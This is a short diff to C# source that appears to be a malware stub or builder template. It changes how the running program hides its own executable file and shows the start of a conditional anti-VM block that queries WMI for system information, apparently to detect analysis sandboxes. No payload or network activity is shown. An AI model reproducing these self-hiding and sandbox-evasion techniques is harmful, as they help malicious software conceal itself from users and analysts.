@@ -30,7 +30,7 @@ namespace namespace_name
         static void Main(string[] args)
         {
             string currentfilename = Process.GetCurrentProcess().MainModule.FileName;
-            File.SetAttributes(currentfilename, FileAttributes.Hidden | FileAttributes.System);
+            File.SetAttributes(currentfilename, FileAttributes.Hidden);
 #if ANTI_VM
             ManagementObjectSearcher searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
             ManagementObjectCollection instances = searcher.Get();
